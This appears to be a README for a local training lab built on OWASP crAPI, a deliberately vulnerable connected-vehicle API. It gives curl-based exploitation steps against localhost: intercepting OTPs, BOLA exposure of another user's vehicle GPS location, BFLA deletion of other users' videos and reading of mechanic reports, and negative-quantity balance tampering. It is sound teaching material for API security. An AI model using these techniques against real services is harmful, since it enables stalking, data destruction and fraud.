# OWASP crAPI - Completely Ridiculous API

## Overview

Production-grade microservices target simulating a modern connected-vehicle platform with full OWASP API Security Top 10 vulnerabilities.

- **Default Port / Access**:
  - Web UI: [http://localhost:8888](http://localhost:8888)
  - MailHog UI: [http://localhost:8025](http://localhost:8025)
- **Directory**: `Classes/02_web_penetration_tester/03_api_penetration_testing/crapi_microservices`

---

## Upstream Documentation & Source of Truth

- **Official GitHub**: [https://github.com/OWASP/crAPI](https://github.com/OWASP/crAPI)
- **Official Docker Deployment**: [https://github.com/OWASP/crAPI/tree/main/deploy/docker](https://github.com/OWASP/crAPI/tree/main/deploy/docker)
- **Official Challenges Specification**: [https://github.com/OWASP/crAPI/blob/main/docs/challenges.md](https://github.com/OWASP/crAPI/blob/main/docs/challenges.md)
- **Official Challenge Solutions**: [https://github.com/OWASP/crAPI/blob/main/docs/challengeSolutions.md](https://github.com/OWASP/crAPI/blob/main/docs/challengeSolutions.md)

---

## Architecture & Microservices

| Service Name                  | Container Name                | Internal Port | Description                                                            |
| :---------------------------- | :---------------------------- | :------------ | :--------------------------------------------------------------------- |
| `crapi-web`                   | `cyberlab_02_crapi_web`       | 80, 443       | Frontend reverse proxy (Angular UI + Nginx API Gateway)                |
| `crapi-identity`              | `cyberlab_02_crapi_identity`  | 8080          | User management, authentication, vehicle registry (Java / Spring Boot) |
| `crapi-community`             | `cyberlab_02_crapi_community` | 8087          | Community forum, post management (Go / Gin)                            |
| `crapi-workshop`              | `cyberlab_02_crapi_workshop`  | 8000          | Shop, mechanic requests, orders (Python / Flask)                       |
| `crapi-chatbot`               | `cyberlab_02_crapi_chatbot`   | 5002          | AI Assistant with prompt injection vulnerabilities (Python)            |
| `postgresdb`                  | `cyberlab_02_crapi_postgres`  | 5432          | PostgreSQL relational datastore                                        |
| `mongodb`                     | `cyberlab_02_crapi_mongo`     | 27017         | MongoDB document datastore                                             |
| `chromadb`                    | `cyberlab_02_crapi_chroma`    | 8000          | Vector database for chatbot semantic retrieval                         |
| `mailhog`                     | `cyberlab_02_crapi_mailhog`   | 1025, 8025    | Simulated SMTP server & Web mailbox viewer                             |
| `api.mypremiumdealership.com` | `cyberlab_02_crapi_gateway`   | 443           | Mock vehicle dealership gateway service                                |

---

## Hands-On Attack Exploitation Guide

### 1. Account Signup & MailHog OTP Interception

crAPI dispatches signup verification tokens and password reset OTPs via MailHog.

#### Step 1.1: Register a New User Account

```bash
curl -s -X POST http://localhost:8888/identity/api/auth/signup \
  -H "Content-Type: application/json" \
  -d '{
    "name": "Attacker",
    "email": "attacker@example.com",
    "number": "5551234567",
    "password": "Password123!"
  }'
```

#### Step 1.2: Intercept Signup OTP via MailHog API

Inspect incoming verification emails directly from the MailHog REST API:

```bash
# Query the latest message body from MailHog
curl -s http://localhost:8025/api/v2/messages | jq '.items[0].Content.Body'
```

You can also visit the MailHog Web UI at [http://localhost:8025](http://localhost:8025) to view formatted emails and vehicle PIN numbers.

#### Step 1.3: Authenticate and Extract JWT Token

```bash
TOKEN=$(curl -s -X POST http://localhost:8888/identity/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{
    "email": "attacker@example.com",
    "password": "Password123!"
  }' | jq -r '.token')

echo "Acquired JWT: $TOKEN"
```

---

### 2. Broken Object Level Authorization (BOLA / IDOR) — Vehicle Location Query

**Vulnerability**: The vehicle location tracking endpoint does not enforce authorization checks to confirm whether the requesting user owns the requested vehicle ID (`vehicleId`).

#### Step 2.1: Leak Another User's Vehicle ID

Query the public community forum endpoint, which inadvertently exposes authors' vehicle identifiers:

```bash
curl -s -H "Authorization: Bearer $TOKEN" \
  http://localhost:8888/community/api/v2/community/posts/recent | jq '.[].author'
```

Locate a victim's `vehicleid` (UUID format, e.g., `8fa75f56-08e6-4993-8f64-4ffecbf35431`).

#### Step 2.2: Exploit BOLA to Expose Victim's Real-Time Coordinates

Query the location endpoint using the victim's UUID:

```bash
VICTIM_VEHICLE_ID="<VICTIM_UUID>"

curl -s -X GET "http://localhost:8888/identity/api/v2/vehicle/${VICTIM_VEHICLE_ID}/location" \
  -H "Authorization: Bearer $TOKEN" | jq .
```

**Response**: Sensitive GPS coordinates (`latitude`, `longitude`) along with vehicle telematics are leaked without authorization.

---

### 3. Broken Function Level Authorization (BFLA) — Administrative Endpoints

**Vulnerability**: Administrative API routes lack role-based access control (RBAC) middleware checks, permitting any low-privileged authenticated user to perform administrative operations.

#### Step 3.1: Access Mechanic Reports (BFLA / IDOR)

Low-privileged users can access arbitrary mechanic service reports without ownership checks:

```bash
curl -s -X GET "http://localhost:8888/workshop/api/mechanic/mechanic_report?report_id=1" \
  -H "Authorization: Bearer $TOKEN" | jq .
```

#### Step 3.2: Delete Other Users' Videos via Shadow Admin Endpoint

Standard users can invoke administrative endpoints to delete uploaded resources:

```bash
VIDEO_ID="1"

curl -s -X DELETE "http://localhost:8888/identity/api/v2/admin/videos/${VIDEO_ID}" \
  -H "Authorization: Bearer $TOKEN"
```

---

### 4. Mass Assignment & Business Logic Manipulation

#### Step 4.1: Negative Quantity Balance Tampering

Purchase items in `/workshop/api/shop/orders` with negative quantities to inflate your available account balance:

```bash
curl -s -X POST http://localhost:8888/workshop/api/shop/orders \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "product_id": 1,
    "quantity": -100
  }' | jq .
```

---

## YouTube Walkthroughs & Solving Guides

- [OWASP API Top 10 crAPI - Course Overview](https://www.youtube.com/watch?v=trN9g-H7Dac)
- [Shadow Academy: Hacking crAPI](https://www.youtube.com/watch?v=wACOKEivJyU)
- [BOLA Vulnerability crAPI application Walkthrough](https://www.youtube.com/watch?v=wsVtR4Mza98)

---

## Quick CLI Control

From the `cyber_lab` root directory:

```bash
# Start crAPI lab
./lab start crapi

# Check status of running containers
./lab status

# Stop crAPI lab
./lab stop crapi
```
